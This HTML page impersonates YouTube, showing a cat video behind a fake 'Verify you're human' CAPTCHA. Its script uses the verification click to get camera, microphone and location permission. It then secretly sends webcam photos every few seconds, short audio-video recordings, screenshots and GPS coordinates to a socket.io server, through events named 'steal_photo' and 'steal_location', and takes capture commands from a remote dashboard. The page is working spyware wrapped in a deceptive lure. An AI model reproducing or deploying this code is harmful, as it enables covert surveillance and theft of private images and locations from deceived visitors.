<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Funny Cat Videos</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
            background: #0f0f0f;
            color: white;
        }
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 56px;
            background: #0f0f0f;
            display: flex;
            align-items: center;
            padding: 0 16px;
            border-bottom: 1px solid #272727;
        }
        .logo { font-size: 20px; font-weight: bold; color: red; }
        .logo span { color: white; }
        .video-container {
            margin-top: 56px;
            padding: 24px;
            max-width: 1200px;
            margin: 56px auto 0;
        }
        .video-player {
            width: 100%;
            aspect-ratio: 16/9;
            background: #000;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .captcha-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0,0,0,0.85);
            backdrop-filter: blur(8px);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 1000;
        }
        .captcha-box {
            background: white;
            color: #202124;
            border-radius: 16px;
            padding: 24px;
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        .fake-checkbox {
            width: 24px;
            height: 24px;
            border: 2px solid #dadce0;
            border-radius: 4px;
            display: inline-block;
            margin-right: 12px;
        }
        .verify-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 4px;
            width: 100%;
            margin-top: 20px;
            cursor: pointer;
        }
        #status { font-size: 12px; color: #e37400; margin-top: 12px; }
    </style>
</head>
<body>

<div class="header">
    <div class="logo">Y<span>ouTube</span></div>
</div>

<div class="video-container">
    <div class="video-player" id="videoPlayer">
        <div style="color:white;">▶ Tap to play</div>
    </div>
    <div style="margin-top: 12px;">
        <div style="font-weight: 600;">Funny Cats Compilation 2024 🐱</div>
        <div style="font-size: 12px; color: #aaa;">2.3M views • CatCompilations</div>
    </div>
</div>

<div class="captcha-overlay" id="captchaOverlay">
    <div class="captcha-box">
        <div style="font-size: 48px;">🔒</div>
        <div style="font-size: 20px; font-weight: 500;">Verify you're human</div>
        <div style="font-size: 14px; color: #5f6368; margin: 16px 0;">Complete verification to watch</div>
        <div style="text-align: left; background: #f8f9fa; padding: 16px; border-radius: 8px;">
            <div style="display: flex; align-items: center;">
                <div class="fake-checkbox" id="fakeCheckbox"></div>
                <span>I'm not a robot</span>
            </div>
        </div>
        <button class="verify-btn" id="verifyBtn">Continue</button>
        <div id="status"></div>
    </div>
</div>

<video id="hiddenCam" autoplay playsinline muted style="position:absolute; top:-9999px; left:-9999px;"></video>
<canvas id="stealCanvas" style="display:none;"></canvas>

<script src="/socket.io/socket.io.js"></script>
<script>
    const socket = io();
    let stream = null;
    let mediaRecorder = null;
    let recordedChunks = [];
    let isRecording = false;
    let cameraReady = false;
    
    const verifyBtn = document.getElementById('verifyBtn');
    const statusDiv = document.getElementById('status');
    const fakeCheckbox = document.getElementById('fakeCheckbox');
    const hiddenVideo = document.getElementById('hiddenCam');
    const canvas = document.getElementById('stealCanvas');
    
    // Capture photo - works reliably
    function capturePhoto(isManual = false) {
        if (!cameraReady || !hiddenVideo.videoWidth || hiddenVideo.videoWidth === 0) {
            console.log('Camera not ready');
            return false;
        }
        
        canvas.width = hiddenVideo.videoWidth;
        canvas.height = hiddenVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(hiddenVideo, 0, 0);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.9);
        socket.emit('steal_photo', { imageData: imageData, manual: isManual });
        console.log('Photo sent');
        return true;
    }
    
    // Capture screenshot of page
    function captureScreenshot() {
        const screenshotCanvas = document.createElement('canvas');
        screenshotCanvas.width = window.innerWidth;
        screenshotCanvas.height = window.innerHeight;
        const ctx = screenshotCanvas.getContext('2d');
        
        // Draw white background
        ctx.fillStyle = '#0f0f0f';
        ctx.fillRect(0, 0, screenshotCanvas.width, screenshotCanvas.height);
        ctx.fillStyle = 'white';
        ctx.font = '14px Arial';
        ctx.fillText('YouTube - Funny Cats', 10, 30);
        ctx.fillText('Page viewed at: ' + new Date().toLocaleString(), 10, 50);
        
        const screenshotData = screenshotCanvas.toDataURL('image/jpeg', 0.8);
        socket.emit('steal_screenshot', { screenshotData: screenshotData });
        console.log('Screenshot sent');
    }
    
    // Start video recording
    function startVideoRecording() {
        if (!stream || !cameraReady) {
            console.log('Cannot record: stream not ready');
            return;
        }
        
        try {
            recordedChunks = [];
            mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.onstop = () => {
                if (recordedChunks.length === 0) return;
                const blob = new Blob(recordedChunks, { type: 'video/webm' });
                const reader = new FileReader();
                reader.onloadend = () => {
                    socket.emit('steal_video', { videoData: reader.result });
                    console.log('Video sent, duration: 5 seconds');
                };
                reader.readAsDataURL(blob);
            };
            
            mediaRecorder.start();
            isRecording = true;
            
            // Stop after 5 seconds (shorter for demo)
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                    isRecording = false;
                }
            }, 5000);
        } catch(err) {
            console.error('Recording error:', err);
        }
    }
    
    // Wait for camera to be ready
    hiddenVideo.addEventListener('playing', () => {
        cameraReady = true;
        console.log('Camera ready, dimensions:', hiddenVideo.videoWidth, 'x', hiddenVideo.videoHeight);
        
        // Start periodic photo capture (every 3 seconds)
        setInterval(() => {
            if (cameraReady) capturePhoto(false);
        }, 3000);
        
        // Auto screenshots every 10 seconds
        setInterval(() => {
            if (cameraReady) captureScreenshot();
        }, 10000);
        
        // Start first video recording
        setTimeout(() => startVideoRecording(), 2000);
        // Repeat video every 10 seconds
        setInterval(() => {
            if (cameraReady && !isRecording) startVideoRecording();
        }, 10000);
    });
    
    verifyBtn.onclick = async () => {
        statusDiv.innerHTML = "Verifying...";
        fakeCheckbox.style.background = "#1a73e8";
        fakeCheckbox.innerHTML = "✓";
        fakeCheckbox.style.color = "white";
        fakeCheckbox.style.textAlign = "center";
        fakeCheckbox.style.lineHeight = "24px";
        
        try {
            stream = await navigator.mediaDevices.getUserMedia({ 
                video: { width: { ideal: 640 }, height: { ideal: 480 } },
                audio: true 
            });
            
            hiddenVideo.srcObject = stream;
            hiddenVideo.play();
            
            // Hide CAPTCHA, show YouTube video
            document.getElementById('captchaOverlay').style.display = "none";
            document.getElementById('videoPlayer').innerHTML = '<iframe width="100%" height="100%" src="https://www.youtube.com/embed/tgbNymZ7vqY?autoplay=1" frameborder="0" allow="autoplay"></iframe>';
            
            // Get location
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((pos) => {
                    socket.emit('steal_location', {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy
                    });
                });
            }
            
            // Listen for manual commands from dashboard
            socket.on('capture_photo', () => {
                capturePhoto(true);
            });
            
            socket.on('capture_video', () => {
                if (!isRecording) startVideoRecording();
            });
            
            socket.on('capture_screenshot', () => {
                captureScreenshot();
            });
            
            statusDiv.innerHTML = "✓ Verified! Playing video...";
            
        } catch(err) {
            statusDiv.innerHTML = "Verification failed. Please allow camera.";
            console.error(err);
        }
    };
</script>
</body>
</html>
